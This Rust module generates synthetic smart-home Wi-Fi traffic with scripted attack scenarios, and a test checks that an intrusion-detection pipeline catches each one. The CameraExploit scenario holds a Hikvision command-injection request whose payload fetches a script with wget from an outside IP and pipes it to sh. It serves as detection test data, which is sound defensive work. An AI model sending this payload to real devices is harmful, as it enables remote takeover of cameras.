//! Synthetic traffic generator.
//!
//! Emulates a monitor-mode capture of a small open-network smart home so the
//! whole pipeline (profiling -> baselines -> anomaly rules -> dashboard) can
//! be demonstrated without a monitor-mode capable Wi-Fi card. Once the
//! baseline learning period has passed it replays a set of attack scenarios.

use crate::model::{ArpInfo, FrameKind, Hint, Mac, NetInfo, PacketInfo, Transport};
use chrono::{DateTime, Duration, Utc};
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use std::collections::HashSet;
use std::net::{IpAddr, Ipv4Addr};

const CHANNEL: u16 = 6;
const TICK_SECS: f64 = 0.1;

struct Target {
    domain: Option<&'static str>,
    ip: Ipv4Addr,
    port: u16,
    udp: bool,
}

struct SimDevice {
    mac: Mac,
    ip: Ipv4Addr,
    rssi: i8,
    ssid_probes: &'static [&'static str],
    targets: Vec<Target>,
    /// Average bytes per second.
    rate: f64,
    /// Fraction of bytes sent by the device (vs. received).
    up_ratio: f64,
    pkt: u32,
    associated: bool,
    /// Identity leaked via DHCP / mDNS / SSDP.
    hostname: &'static str,
    vendor_class: Option<&'static str>,
    services: &'static [&'static str],
    server: Option<&'static str>,
}

#[derive(Clone, Copy, Debug)]
enum Scenario {
    CameraUnknownHost,
    PlugTelnetScan,
    ThermostatExfil,
    DeauthFlood,
    RogueDevice,
    /// A Raspberry Pi answers ARP for the router (man-in-the-middle).
    ArpSpoof,
    /// The light bridge looks up random-looking (DGA) domains.
    DgaBeacon,
    /// An internet host sends a Hikvision exploit to the camera's web server.
    CameraExploit,
}

const SCENARIOS: [Scenario; 8] = [
    Scenario::CameraExploit,
    Scenario::CameraUnknownHost,
    Scenario::PlugTelnetScan,
    Scenario::ArpSpoof,
    Scenario::ThermostatExfil,
    Scenario::DeauthFlood,
    Scenario::DgaBeacon,
    Scenario::RogueDevice,
];

/// The simulated router's address (also its DNS resolver).
pub const GATEWAY_IP: [u8; 4] = [192, 168, 1, 1];

struct Active {
    kind: Scenario,
    tick: u32,
    ticks: u32,
    salt: u8,
}

pub struct Simulator {
    rng: StdRng,
    ap: Mac,
    ap_rssi: i8,
    neighbor_ap: Mac,
    gw_ip: Ipv4Addr,
    devices: Vec<SimDevice>,
    resolved: HashSet<(usize, Ipv4Addr)>,
    next_scenario: DateTime<Utc>,
    scenario_idx: usize,
    rounds: u8,
    active: Option<Active>,
    tick_no: u64,
    rogue: Option<SimDevice>,
}

fn mac(s: &str) -> Mac {
    s.parse().expect("valid sim MAC")
}

fn t(domain: &'static str, ip: [u8; 4], port: u16) -> Target {
    Target {
        domain: Some(domain),
        ip: Ipv4Addr::from(ip),
        port,
        udp: port == 123,
    }
}

impl Simulator {
    pub fn new(learning_minutes: u32) -> Self {
        let devices = vec![
            SimDevice {
                mac: mac("44:19:b6:3a:7c:10"),
                ip: Ipv4Addr::new(192, 168, 1, 21),
                rssi: -55,
                ssid_probes: &[],
                targets: vec![
                    t("dev.hik-connect.com", [52, 204, 10, 15], 443),
                    t("stream.hik-connect.com", [54, 86, 110, 3], 443),
                    t("pool.ntp.org", [162, 159, 200, 1], 123),
                ],
                rate: 45_000.0,
                up_ratio: 0.92,
                pkt: 1400,
                associated: false,
                hostname: "HIKVISION-DS2CD2143",
                vendor_class: Some("udhcp 1.20.2"),
                services: &[],
                server: Some("Linux/3.0.8, UPnP/1.0, Hikvision-Webs"),
            },
            SimDevice {
                mac: mac("44:61:32:9b:02:7e"),
                ip: Ipv4Addr::new(192, 168, 1, 22),
                rssi: -63,
                ssid_probes: &[],
                targets: vec![
                    t("api.ecobee.com", [3, 215, 10, 44], 443),
                    t("home.ecobee.com", [3, 215, 10, 45], 443),
                ],
                rate: 400.0,
                up_ratio: 0.5,
                pkt: 300,
                associated: false,
                hostname: "ecobee-Thermostat",
                vendor_class: Some("udhcp 1.27.2"),
                services: &[],
                server: None,
            },
            SimDevice {
                mac: mac("00:17:88:6a:41:f3"),
                ip: Ipv4Addr::new(192, 168, 1, 23),
                rssi: -58,
                ssid_probes: &[],
                targets: vec![
                    t("ws.meethue.com", [18, 195, 32, 7], 443),
                    t("diagnostics.meethue.com", [18, 195, 32, 9], 443),
                ],
                rate: 250.0,
                up_ratio: 0.5,
                pkt: 250,
                associated: false,
                hostname: "Philips-hue",
                vendor_class: None,
                services: &["_hue._tcp"],
                server: Some("Hue/1.0 UPnP/1.0 IpBridge/1.60.0"),
            },
            SimDevice {
                mac: mac("44:65:0d:c2:88:19"),
                ip: Ipv4Addr::new(192, 168, 1, 24),
                rssi: -50,
                ssid_probes: &[],
                targets: vec![
                    t("avs-alexa-na.amazon.com", [54, 239, 31, 10], 443),
                    t("device-metrics-us.amazon.com", [52, 94, 233, 12], 443),
                    t("pool.ntp.org", [162, 159, 200, 1], 123),
                ],
                rate: 3_000.0,
                up_ratio: 0.4,
                pkt: 600,
                associated: false,
                hostname: "amazon-c2881922",
                vendor_class: Some("dhcpcd-6.8.2"),
                services: &["_amzn-wplay._tcp"],
                server: None,
            },
            SimDevice {
                mac: mac("24:0a:c4:5d:19:e2"),
                ip: Ipv4Addr::new(192, 168, 1, 25),
                rssi: -67,
                ssid_probes: &[],
                targets: vec![t("a1.tuyaus.com", [52, 42, 18, 200], 8883)],
                rate: 120.0,
                up_ratio: 0.5,
                pkt: 180,
                associated: false,
                hostname: "ESP_5D19E2",
                vendor_class: None,
                services: &[],
                server: None,
            },
            SimDevice {
                mac: mac("b0:a7:37:42:6d:11"),
                ip: Ipv4Addr::new(192, 168, 1, 26),
                rssi: -60,
                ssid_probes: &[],
                targets: vec![
                    t("api.roku.com", [34, 199, 120, 5], 443),
                    t("ipv4-c001.nflxvideo.net", [45, 57, 3, 130], 443),
                ],
                rate: 120_000.0,
                up_ratio: 0.04,
                pkt: 1450,
                associated: false,
                hostname: "Living-Room-Roku",
                vendor_class: None,
                services: &[],
                server: Some("Roku/12.5.0 UPnP/1.0 Roku/12.5.0"),
            },
            SimDevice {
                mac: mac("a4:34:d9:10:aa:5b"),
                ip: Ipv4Addr::new(192, 168, 1, 30),
                rssi: -45,
                ssid_probes: &["HomeNet", "eduroam"],
                targets: vec![
                    t("www.google.com", [142, 250, 72, 4], 443),
                    t("github.com", [140, 82, 112, 4], 443),
                    t("en.wikipedia.org", [208, 80, 154, 224], 443),
                    t("www.youtube.com", [142, 250, 72, 14], 443),
                    t("canvas.university.edu", [151, 101, 1, 10], 443),
                ],
                rate: 25_000.0,
                up_ratio: 0.15,
                pkt: 1200,
                associated: false,
                hostname: "Student-Laptop",
                vendor_class: Some("MSFT 5.0"),
                services: &[],
                server: None,
            },
            SimDevice {
                mac: mac("da:4b:12:9e:c0:07"),
                ip: Ipv4Addr::new(192, 168, 1, 31),
                rssi: -52,
                ssid_probes: &["HomeNet", "Starbucks WiFi", "eduroam", "Airport_Free"],
                targets: vec![
                    t("www.apple.com", [17, 253, 144, 10], 443),
                    t("gateway.icloud.com", [17, 248, 190, 12], 443),
                    t("graph.instagram.com", [157, 240, 22, 63], 443),
                ],
                rate: 8_000.0,
                up_ratio: 0.2,
                pkt: 900,
                associated: false,
                hostname: "iPhone",
                vendor_class: None,
                services: &["_companion-link._tcp"],
                server: None,
            },
        ];
        Simulator {
            rng: StdRng::from_entropy(),
            ap: mac("50:c7:bf:4e:21:01"),
            ap_rssi: -38,
            neighbor_ap: mac("a0:40:a0:77:12:9c"),
            gw_ip: Ipv4Addr::from(GATEWAY_IP),
            devices,
            resolved: HashSet::new(),
            next_scenario: Utc::now()
                + Duration::minutes(learning_minutes as i64)
                + Duration::seconds(15),
            scenario_idx: 0,
            rounds: 0,
            active: None,
            tick_no: 0,
            rogue: None,
        }
    }

    fn jitter(&mut self, rssi: i8) -> i8 {
        (rssi as i16 + self.rng.gen_range(-4..=4)).clamp(-95, -20) as i8
    }

    #[allow(clippy::too_many_arguments)]
    fn mgmt(
        &mut self,
        ts: DateTime<Utc>,
        subtype: &'static str,
        src: Mac,
        dst: Mac,
        bssid: Mac,
        rssi: i8,
        ssid: Option<&str>,
    ) -> PacketInfo {
        let mut p = PacketInfo::new(
            ts,
            FrameKind::Management,
            subtype,
            if ssid.is_some() { 180 } else { 38 },
        );
        p.src = Some(src);
        p.dst = Some(dst);
        p.bssid = Some(bssid);
        p.rssi = Some(self.jitter(rssi));
        p.channel = Some(CHANNEL);
        p.ssid = ssid.map(str::to_string);
        p
    }

    fn ack(&mut self, ts: DateTime<Utc>, to: Mac, rssi: i8) -> PacketInfo {
        let mut p = PacketInfo::new(ts, FrameKind::Control, "ack", 14);
        p.dst = Some(to);
        p.rssi = Some(self.jitter(rssi));
        p.channel = Some(CHANNEL);
        p
    }

    #[allow(clippy::too_many_arguments)]
    fn data(
        &mut self,
        ts: DateTime<Utc>,
        sta: Mac,
        sta_rssi: i8,
        uplink: bool,
        len: u32,
        sta_ip: Ipv4Addr,
        remote: Ipv4Addr,
        sport: u16,
        dport: u16,
        udp: bool,
        syn: bool,
    ) -> PacketInfo {
        let mut p = PacketInfo::new(ts, FrameKind::Data, "qos-data", len);
        p.bssid = Some(self.ap);
        p.channel = Some(CHANNEL);
        let transport = if udp { Transport::Udp } else { Transport::Tcp };
        if uplink {
            p.src = Some(sta);
            p.dst = Some(self.ap);
            p.to_ds = true;
            p.rssi = Some(self.jitter(sta_rssi));
            p.net = Some(NetInfo {
                src_ip: IpAddr::V4(sta_ip),
                dst_ip: IpAddr::V4(remote),
                transport,
                src_port: Some(sport),
                dst_port: Some(dport),
                tcp_syn: syn && !udp,
                dns_query: None,
                dns_answers: vec![],
                sni: None,
                hints: vec![],
                routers: vec![],
                router_adv: None,
                tls: None,
                dns_response: false,
                dns_rcode: 0,
                icmp: None,
                nd_target: None,
                payload: vec![],
            });
        } else {
            p.src = Some(self.ap);
            p.dst = Some(sta);
            p.from_ds = true;
            p.rssi = Some(self.jitter(self.ap_rssi));
            p.net = Some(NetInfo {
                src_ip: IpAddr::V4(remote),
                dst_ip: IpAddr::V4(sta_ip),
                transport,
                src_port: Some(dport),
                dst_port: Some(sport),
                tcp_syn: false,
                dns_query: None,
                dns_answers: vec![],
                sni: None,
                hints: vec![],
                routers: vec![],
                router_adv: None,
                tls: None,
                dns_response: false,
                dns_rcode: 0,
                icmp: None,
                nd_target: None,
                payload: vec![],
            });
        }
        p
    }

    fn arp(&mut self, ts: DateTime<Utc>, sender: Mac, ip: Ipv4Addr) -> PacketInfo {
        let mut p = PacketInfo::new(ts, FrameKind::Data, "qos-data", 68);
        p.src = Some(sender);
        p.dst = Some(Mac::BROADCAST);
        p.bssid = Some(self.ap);
        p.to_ds = sender != self.ap;
        p.from_ds = sender == self.ap;
        p.channel = Some(CHANNEL);
        p.rssi = Some(self.jitter(if sender == self.ap { self.ap_rssi } else { -66 }));
        p.arp = Some(ArpInfo {
            sender_mac: sender,
            sender_ip: ip,
            target_ip: ip,
            reply: true,
        });
        p
    }

    fn dns_pair(
        &mut self,
        ts: DateTime<Utc>,
        sta: Mac,
        rssi: i8,
        sta_ip: Ipv4Addr,
        name: &str,
        ip: Ipv4Addr,
    ) -> [PacketInfo; 2] {
        let sport = self.rng.gen_range(40000..60000);
        let gw = self.gw_ip;
        let mut q = self.data(ts, sta, rssi, true, 90, sta_ip, gw, sport, 53, true, false);
        if let Some(n) = q.net.as_mut() {
            n.dns_query = Some(name.to_string());
        }
        let mut r = self.data(
            ts, sta, rssi, false, 120, sta_ip, gw, sport, 53, true, false,
        );
        if let Some(n) = r.net.as_mut() {
            n.dns_query = Some(name.to_string());
            n.dns_answers = vec![(name.to_string(), IpAddr::V4(ip))];
            n.dns_response = true;
        }
        [q, r]
    }

    /// Generate the next ~100 ms worth of frames.
    pub fn step(&mut self, ts: DateTime<Utc>) -> Vec<PacketInfo> {
        let mut out = Vec::with_capacity(128);
        self.tick_no += 1;
        let (ap, neighbor) = (self.ap, self.neighbor_ap);

        // Beacons: our AP ~2/s, neighbor ~1/s
        if self.tick_no.is_multiple_of(5) {
            let rssi = self.ap_rssi;
            out.push(self.mgmt(ts, "beacon", ap, Mac::BROADCAST, ap, rssi, Some("HomeNet")));
        }
        if self.tick_no % 10 == 3 {
            out.push(self.mgmt(
                ts,
                "beacon",
                neighbor,
                Mac::BROADCAST,
                neighbor,
                -79,
                Some("NETGEAR-Guest"),
            ));
        }
        // The router announces itself now and then (gratuitous ARP).
        if self.tick_no % 300 == 1 {
            let gw = self.gw_ip;
            out.push(self.arp(ts, ap, gw));
        }
        // Passers-by with randomized MACs probing for networks.
        if self.rng.gen_bool(0.01) {
            let mut m = [0u8; 6];
            self.rng.fill(&mut m);
            m[0] = (m[0] | 0x02) & 0xfe;
            let ssid = ["xfinitywifi", "attwifi", "Pixel_4821", "DIRECT-roku-112"]
                [self.rng.gen_range(0..4)];
            let rssi = self.rng.gen_range(-90..-75);
            out.push(self.mgmt(
                ts,
                "probe-req",
                Mac(m),
                Mac::BROADCAST,
                Mac::BROADCAST,
                rssi,
                Some(ssid),
            ));
        }

        let mut devices = std::mem::take(&mut self.devices);
        if let Some(r) = self.rogue.take() {
            devices.push(r);
        }
        for (i, d) in devices.iter_mut().enumerate() {
            if !d.associated {
                d.associated = true;
                out.push(self.mgmt(ts, "auth", d.mac, ap, ap, d.rssi, None));
                out.push(self.mgmt(ts, "assoc-req", d.mac, ap, ap, d.rssi, Some("HomeNet")));
                out.push(self.mgmt(ts, "assoc-resp", ap, d.mac, ap, -38, None));
                let mut hints = vec![];
                if !d.hostname.is_empty() {
                    hints.push(Hint::Hostname(d.hostname.into()));
                }
                if let Some(vc) = d.vendor_class {
                    hints.push(Hint::VendorClass(vc.into()));
                }
                if !hints.is_empty() {
                    let mut p = self.data(
                        ts,
                        d.mac,
                        d.rssi,
                        true,
                        342,
                        Ipv4Addr::UNSPECIFIED,
                        Ipv4Addr::BROADCAST,
                        68,
                        67,
                        true,
                        false,
                    );
                    p.dst = Some(Mac::BROADCAST);
                    if let Some(n) = p.net.as_mut() {
                        n.hints = hints;
                    }
                    out.push(p);
                }
            }
            if (!d.services.is_empty() || d.server.is_some()) && self.rng.gen_bool(0.003) {
                let (dst_ip, port, hints) = if let Some(srv) = d.server {
                    (
                        Ipv4Addr::new(239, 255, 255, 250),
                        1900,
                        vec![Hint::Server(srv.into())],
                    )
                } else {
                    let mut h: Vec<Hint> = d
                        .services
                        .iter()
                        .map(|s| Hint::Service((*s).into()))
                        .collect();
                    h.push(Hint::Hostname(d.hostname.into()));
                    (Ipv4Addr::new(224, 0, 0, 251), 5353, h)
                };
                let mut p = self.data(
                    ts, d.mac, d.rssi, true, 300, d.ip, dst_ip, port, port, true, false,
                );
                p.dst = Some(Mac([0x01, 0x00, 0x5e, 0x7f, 0xff, 0xfa]));
                if let Some(n) = p.net.as_mut() {
                    n.hints = hints;
                }
                out.push(p);
            }
            if !d.ssid_probes.is_empty() && self.rng.gen_bool(0.004) {
                let s = d.ssid_probes[self.rng.gen_range(0..d.ssid_probes.len())];
                out.push(self.mgmt(
                    ts,
                    "probe-req",
                    d.mac,
                    Mac::BROADCAST,
                    Mac::BROADCAST,
                    d.rssi,
                    Some(s),
                ));
            }
            // Power-save null frames
            if self.rng.gen_bool(0.02) {
                let mut p = PacketInfo::new(ts, FrameKind::Data, "null", 28);
                p.src = Some(d.mac);
                p.dst = Some(ap);
                p.bssid = Some(ap);
                p.to_ds = true;
                p.rssi = Some(self.jitter(d.rssi));
                p.channel = Some(CHANNEL);
                out.push(p);
            }

            let budget = d.rate * TICK_SECS * self.rng.gen_range(0.3..1.7);
            let mut n = (budget / d.pkt as f64).round() as u32;
            if n == 0 && self.rng.gen_bool((budget / d.pkt as f64).min(1.0)) {
                n = 1;
            }
            for _ in 0..n.min(40) {
                let ti = self.rng.gen_range(0..d.targets.len());
                let (domain, rip, port, udp) = {
                    let tg = &d.targets[ti];
                    (tg.domain, tg.ip, tg.port, tg.udp)
                };
                let mut syn = false;
                if self.resolved.insert((i, rip)) {
                    if let Some(name) = domain {
                        out.extend(self.dns_pair(ts, d.mac, d.rssi, d.ip, name, rip));
                    }
                    syn = true;
                }
                let up = self.rng.gen_bool(d.up_ratio);
                let len = self.rng.gen_range(d.pkt / 3..=d.pkt);
                let sport = 40000 + (ti as u16) * 7 + (i as u16) * 101;
                out.push(self.data(
                    ts,
                    d.mac,
                    d.rssi,
                    up || syn,
                    len,
                    d.ip,
                    rip,
                    sport,
                    port,
                    udp,
                    syn,
                ));
                if self.rng.gen_bool(0.5) {
                    let to = if up { d.mac } else { ap };
                    out.push(self.ack(ts, to, d.rssi));
                }
            }
        }
        // The rogue device (scenario 5) lives at the end of the list.
        if devices.len() > 8 {
            self.rogue = devices.pop();
        }
        self.devices = devices;

        // Scenario scheduling
        if self.active.is_none() && ts >= self.next_scenario {
            let kind = SCENARIOS[self.scenario_idx % SCENARIOS.len()];
            self.scenario_idx += 1;
            if self.scenario_idx.is_multiple_of(SCENARIOS.len()) {
                self.rounds = self.rounds.wrapping_add(1);
            }
            let ticks = match kind {
                Scenario::CameraUnknownHost => 50,
                Scenario::PlugTelnetScan => 30,
                Scenario::ThermostatExfil => 80,
                Scenario::DeauthFlood => 30,
                Scenario::RogueDevice => 1,
                Scenario::ArpSpoof => 20,
                Scenario::DgaBeacon => 10,
                Scenario::CameraExploit => 4,
            };
            self.active = Some(Active {
                kind,
                tick: 0,
                ticks,
                salt: self.rounds,
            });
            self.next_scenario = ts + Duration::seconds(self.rng.gen_range(35..55));
        }
        if let Some(mut a) = self.active.take() {
            self.run_scenario(ts, &mut a, &mut out);
            a.tick += 1;
            if a.tick < a.ticks {
                self.active = Some(a);
            }
        }
        out
    }

    fn run_scenario(&mut self, ts: DateTime<Utc>, a: &mut Active, out: &mut Vec<PacketInfo>) {
        match a.kind {
            Scenario::CameraUnknownHost => {
                let (m, r, ip) = (
                    self.devices[0].mac,
                    self.devices[0].rssi,
                    self.devices[0].ip,
                );
                let rip = Ipv4Addr::new(185, 220, 101, 47u8.wrapping_add(a.salt));
                for k in 0..2 {
                    let syn = a.tick == 0 && k == 0;
                    out.push(self.data(ts, m, r, true, 600, ip, rip, 51515, 9001, false, syn));
                }
            }
            Scenario::PlugTelnetScan => {
                let (m, r, ip) = (
                    self.devices[4].mac,
                    self.devices[4].rssi,
                    self.devices[4].ip,
                );
                for _ in 0..4 {
                    let rip = Ipv4Addr::new(
                        self.rng.gen_range(60..220),
                        self.rng.gen(),
                        self.rng.gen(),
                        self.rng.gen_range(1..254),
                    );
                    let port = if self.rng.gen_bool(0.7) { 23 } else { 2323 };
                    let sport = self.rng.gen_range(30000..60000);
                    out.push(self.data(ts, m, r, true, 60, ip, rip, sport, port, false, true));
                }
            }
            Scenario::ThermostatExfil => {
                let (m, r, ip) = (
                    self.devices[1].mac,
                    self.devices[1].rssi,
                    self.devices[1].ip,
                );
                let rip = Ipv4Addr::new(45, 153, 160, 2u8.wrapping_add(a.salt));
                if a.tick == 0 {
                    out.extend(self.dns_pair(ts, m, r, ip, "upload.storage-sync.xyz", rip));
                }
                for k in 0..55 {
                    out.push(self.data(
                        ts,
                        m,
                        r,
                        true,
                        1460,
                        ip,
                        rip,
                        52020,
                        443,
                        false,
                        a.tick == 0 && k == 0,
                    ));
                }
            }
            Scenario::DeauthFlood => {
                let ap = self.ap;
                for _ in 0..5 {
                    out.push(self.mgmt(ts, "deauth", ap, Mac::BROADCAST, ap, -71, None));
                }
            }
            Scenario::ArpSpoof => {
                if a.tick.is_multiple_of(4) {
                    let pi = Mac([0xdc, 0xa6, 0x32, 0x5e, 0x10, 0x07u8.wrapping_add(a.salt)]);
                    let gw = self.gw_ip;
                    out.push(self.arp(ts, pi, gw));
                }
            }
            Scenario::CameraExploit => {
                let (m, r, ip) = (
                    self.devices[0].mac,
                    self.devices[0].rssi,
                    self.devices[0].ip,
                );
                let attacker = Ipv4Addr::new(45, 95, 147, 236);
                // Request in, the camera's web server answers.
                let mut req =
                    self.data(ts, m, r, false, 380, ip, attacker, 80, 47123, false, false);
                if let Some(n) = req.net.as_mut() {
                    n.payload = b"PUT /SDK/webLanguage HTTP/1.1\r\nHost: 192.168.1.21\r\nContent-Type: application/xml\r\n\r\n<language>$(wget http://45.95.147.236/x -O-|sh)</language>".to_vec();
                }
                out.push(req);
                let mut resp =
                    self.data(ts, m, r, true, 240, ip, attacker, 80, 47123, false, false);
                if let Some(n) = resp.net.as_mut() {
                    n.payload = b"HTTP/1.1 500 Internal Server Error\r\n\r\n".to_vec();
                }
                out.push(resp);
                // Telnet left enabled answering the same attacker.
                let mut tel = self.data(ts, m, r, true, 90, ip, attacker, 23, 51234, false, false);
                if let Some(n) = tel.net.as_mut() {
                    n.payload = b"\r\nlogin: ".to_vec();
                }
                out.push(tel);
            }
            Scenario::DgaBeacon => {
                let (m, r, ip) = (
                    self.devices[2].mac,
                    self.devices[2].rssi,
                    self.devices[2].ip,
                );
                let name: String = (0..13)
                    .map(|_| {
                        let c = self.rng.gen_range(0..36u8);
                        (if c < 26 { b'a' + c } else { b'0' + c - 26 }) as char
                    })
                    .collect();
                let tld = ["net", "info", "top", "xyz"][self.rng.gen_range(0..4)];
                let [q, _] = self.dns_pair(
                    ts,
                    m,
                    r,
                    ip,
                    &format!("{name}.{tld}"),
                    Ipv4Addr::UNSPECIFIED,
                );
                out.push(q); // NXDOMAIN: the C2 domain for today isn't registered
            }
            Scenario::RogueDevice => {
                let salt = a.salt;
                self.rogue = Some(SimDevice {
                    mac: Mac([0x84, 0xcc, 0xa8, 0x11, 0x22, 0x33u8.wrapping_add(salt)]),
                    ip: Ipv4Addr::new(192, 168, 1, 77u8.wrapping_add(salt)),
                    rssi: -70,
                    ssid_probes: &[],
                    targets: vec![Target {
                        domain: None,
                        ip: Ipv4Addr::new(203, 0, 113, 50),
                        port: 1883,
                        udp: false,
                    }],
                    rate: 150.0,
                    up_ratio: 0.6,
                    pkt: 200,
                    associated: false,
                    hostname: "",
                    vendor_class: None,
                    services: &[],
                    server: None,
                });
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn produces_traffic() {
        let mut s = Simulator::new(0);
        let n: usize = (0..20).map(|_| s.step(Utc::now()).len()).sum();
        assert!(n > 50);
    }

    /// Full pipeline: 1 minute of baseline learning, then every scripted
    /// attack must be caught by the matching rule.
    #[test]
    fn scenarios_are_detected() {
        use crate::engine::Engine;
        use crate::oui::OuiDb;
        use crate::settings::RuleSettings;
        use std::collections::BTreeSet;

        let rules = RuleSettings {
            learning_minutes: 1,
            ..Default::default()
        };
        let mut eng = Engine::new(rules, OuiDb::load(None));
        eng.gateway_ip = Some(IpAddr::V4(GATEWAY_IP.into()));
        let mut set = crate::ids::RuleSet::default();
        set.add_text("built-in", crate::ids::BUILTIN);
        set.build();
        eng.ids = std::sync::Arc::new(set);
        let mut sim = Simulator::new(1);
        let t0 = Utc::now();
        eng.begin_session(Some(t0));
        for i in 0..(10 * 60 * 7) {
            let ts = t0 + Duration::milliseconds(i * 100);
            for p in sim.step(ts) {
                eng.process(&p);
            }
            if i % 10 == 0 {
                eng.tick(Some(ts));
            }
        }
        for a in &eng.alerts {
            eprintln!(
                "{:?} {:<17} {} | {}",
                a.severity, a.rule, a.title, a.message
            );
        }
        let rules: BTreeSet<&str> = eng.alerts.iter().map(|a| a.rule.as_str()).collect();
        for expected in [
            "new-destination",
            "unexpected-port",
            "risky-port",
            "connection-burst",
            "volume-spike",
            "deauth-flood",
            "new-device",
            "arp-spoof",
            "suspicious-domain",
            "ids-signature",
        ] {
            assert!(
                rules.contains(expected),
                "missing {expected}; got {rules:?}"
            );
        }
        // Quiet devices must not produce noise.
        let cam: Mac = "44:19:b6:3a:7c:10".parse().unwrap();
        assert_eq!(eng.devices[&cam].auto_class, "Smart Camera");
        let laptop: Mac = "a4:34:d9:10:aa:5b".parse().unwrap();
        assert!(
            !eng.alerts.iter().any(|a| a.device == Some(laptop)),
            "laptop should be quiet"
        );
        let ap: Mac = "50:c7:bf:4e:21:01".parse().unwrap();
        assert!(
            !eng.alerts
                .iter()
                .any(|a| a.device == Some(ap) && a.rule == "volume-spike"),
            "AP must not echo spikes"
        );
        let findings = crate::exposure::assess(&eng.devices[&cam], &eng.kev);
        assert!(
            findings.iter().any(|f| f.id == "telnet-server")
                && findings.iter().any(|f| f.id == "http-admin"),
            "{findings:?}"
        );
        let (_, dns) = eng.drain_records();
        assert!(!dns.is_empty(), "DNS log populated");
        let gateways: Vec<Mac> = eng
            .devices
            .values()
            .filter(|d| d.is_gateway)
            .map(|d| d.mac)
            .collect();
        assert_eq!(gateways, vec![ap], "only the router is a gateway");
        assert_eq!(
            eng.devices[&laptop].hostname.as_deref(),
            Some("Student-Laptop")
        );
        assert_eq!(eng.devices[&laptop].auto_class, "Laptop / PC");
        // Network diagram: open alerts with an address become threat entries
        // naming the device and the traffic it exchanged with that address.
        let threats = crate::topology_threats(&eng);
        for t in &threats {
            eprintln!(
                "THREAT {:?} {} {:?} devs={:?} tx={} rx={} ports={:?} rules={:?}",
                t.severity,
                t.address,
                t.domain,
                t.devices.iter().map(|d| &d.label).collect::<Vec<_>>(),
                t.tx,
                t.rx,
                t.ports,
                t.reasons.iter().map(|r| &r.rule).collect::<Vec<_>>()
            );
        }
        assert!(!threats.is_empty(), "threat addresses listed");
        assert!(threats.windows(2).all(|w| w[0].severity >= w[1].severity));
        let ids = threats
            .iter()
            .find(|t| t.reasons.iter().any(|r| r.rule == "ids-signature"))
            .expect("IDS hit has an address");
        assert!(!ids.devices.is_empty());
        assert!(
            ids.tx + ids.rx > 0,
            "traffic with the attacker is attributed"
        );
        // ARP spoofing: the threat is the spoofer, never the router it impersonates.
        let spoof = threats
            .iter()
            .find(|t| t.reasons.iter().any(|r| r.rule == "arp-spoof"))
            .expect("spoofer listed");
        assert_ne!(
            spoof.address,
            std::net::Ipv4Addr::from(GATEWAY_IP).to_string()
        );
        assert!(spoof.internal && spoof.domain.is_none());
    }
}
